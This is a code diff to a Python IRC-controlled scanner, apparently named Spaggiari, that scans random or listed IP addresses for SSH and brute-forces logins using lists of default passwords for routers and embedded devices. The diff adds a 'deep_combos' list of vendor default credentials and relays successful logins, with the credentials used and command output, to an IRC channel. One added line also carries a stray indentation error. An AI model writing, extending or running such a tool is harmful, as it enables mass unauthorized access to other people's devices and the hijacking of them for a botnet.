@@ -33,7 +33,10 @@ timeout_ssh     = 10
 # SSH Login Combos
 combos = OrderedDict([
     ('root',  ('root','toor','admin','changeme','pass','password','1234','12345','123456')),
-    ('admin', ('1234','12345','123456','4321','9999','abc123','admin','changeme','admin123','password')),
+    ('admin', ('1234','12345','123456','4321','9999','abc123','admin','changeme','admin123','password'))
+])
+
+deep_combos = OrderedDict([
     ('root',      ('alien','alpine','calvin','kn1TG7psLu','logapp','openelec','pixmet2003','raspberrypi','rasplex','rootme','soho','TANDBERG','trendimsa1.0')),
     ('admin',     ('aerohive','kn1TG7psLu','TANDBERG')),
     ('alien',     'alien'),
@@ -121,7 +124,7 @@ def check_port(ip, port):
         sock.close()
 
 def check_range(targets):
-    found   = False
+    found = False
     for ip in targets:
         if found:
             break
@@ -170,7 +173,7 @@ class random_scan(threading.Thread):
         threading.Thread.__init__(self)
     def run(self):
         while True:
-            if SpaggiariBot.stop_scan:
+            if Spaggiari.stop_scan:
                 break
             else:
                 ip = (random_ip(), )
@@ -185,7 +188,7 @@ class range_scan(threading.Thread):
         threading.Thread.__init__(self)
     def run(self):
         for ip in self.ip_range:
-            if SpaggiariBot.stop_scan:
+            if Spaggiari.stop_scan:
                 break
             else:
                 ssh_bruteforce(ip).start()
@@ -194,8 +197,8 @@ class range_scan(threading.Thread):
                     time.sleep(1)
         while threading.activeCount() >= 2:
             time.sleep(1)
-        SpaggiariBot.scanning = False
-        SpaggiariBot.sendmsg(chan, '[{0}] - Scan has completed.'.format(color('#', blue)))
+        Spaggiari.scanning = False
+        Spaggiari.sendmsg(channel, '[{0}] - Scan has completed.'.format(color('#', blue)))
 
 class ssh_bruteforce(threading.Thread):
     def __init__(self, ip):
@@ -206,7 +209,7 @@ class ssh_bruteforce(threading.Thread):
         if check_port(self.ip, 22):
             for username in combos:
                 for password in combos[username]:
-                    if SpaggiariBot.stop_scan or self.timeouts >= timeout_breaker:
+                    if Spaggiari.stop_scan or self.timeouts >= timeout_breaker:
                         break
                     else:
                         result = ssh_connect(self.ip, username, password)
@@ -222,14 +225,17 @@ def ssh_connect(hostname, username, password):
     try:
         ssh.connect(hostname, 22, username, password, timeout=timeout_ssh)
         stdin,stdout,stderr = ssh.exec_command('echo lol')
-        if 'ogin:' in stdout.readlines():
-            raise Exception('Invalid')
+        for line in stdout.readlines():
+            if 'ogin:' in line:
+                raise Exception('Invalid')
+            else:
+                Spaggiari.sendmsg(channel, line)
     except socket.timeout:
         return 1
     except:
         return 0
     else:
-        SpaggiariBot.sendmsg(channel, '[{0}] - Successful connection to {1} using {2}:{3}'.format(color('+', green), hostname, username, password))
+        Spaggiari.sendmsg(channel, '[{0}] - Successful connection to {1} using {2}:{3}'.format(color('+', green), hostname, username, password))
         return 2
     finally:
         ssh.close()
@@ -263,7 +269,7 @@ class IRC(object):
             self.sock.connect((self.server, self.port))
             if self.password:
                 self.raw('PASS ' + self.password)
-            self.raw('USER {0} 0 * :{1}'.format(random_str(5), random_str(5)))
+            self.raw(f'USER {random_str(5)} 0 * :{random_str(5)}')
             self.nick(self.nickname)
         except Exception as ex:
             error('Failed to connect to IRC server.', ex)
@@ -377,15 +383,16 @@ class IRC(object):
             self.event_kick(nick, chan, kicked)
         elif args[1] == 'PRIVMSG':
             nick = args[0].split('!')[0][1:]
-            host = args[0].split('!')[1].split('@')[1]
-            chan = args[2]
-            msg  = data.split('{0} PRIVMSG {1} :'.format(args[0], chan))[1]
-            if chan != self.nickname and nick != self.nickname:
-                self.event_message(nick, host, chan, msg)
+            if nick != self.nickname:
+                host = args[0].split('!')[1].split('@')[1]
+                chan = args[2]
+                if chan == self.channel:
+                    msg = data.split(f'{args[0]} PRIVMSG {chan} :')[1]
+                     self.event_message(nick, host, chan, msg)
 
     def join(self, chan, key=None):
         if key:
-            self.raw('JOIN {0} {1}'.format(chan, key))
+            self.raw(f'JOIN {chan} {key}')
         else:
             self.raw('JOIN ' + chan)
 
@@ -418,7 +425,7 @@ class IRC(object):
         self.sock.send(bytes(msg + '\r\n', 'utf-8'))
 
     def sendmsg(self, target, msg):
-        self.raw('PRIVMSG {0} :{1}'.format(target, msg))
+        self.raw(f'PRIVMSG {target} :{msg}')
 
 # Main
 print(''.rjust(56, '#'))
@@ -436,5 +443,5 @@ except ImportError:
     error_exit('Failed to import the Paramiko library!')
 else:
     paramiko.util.log_to_file('/dev/null')
-SpaggiariBot = IRC()
-SpaggiariBot.start()
+Spaggiari = IRC()
+Spaggiari.start()
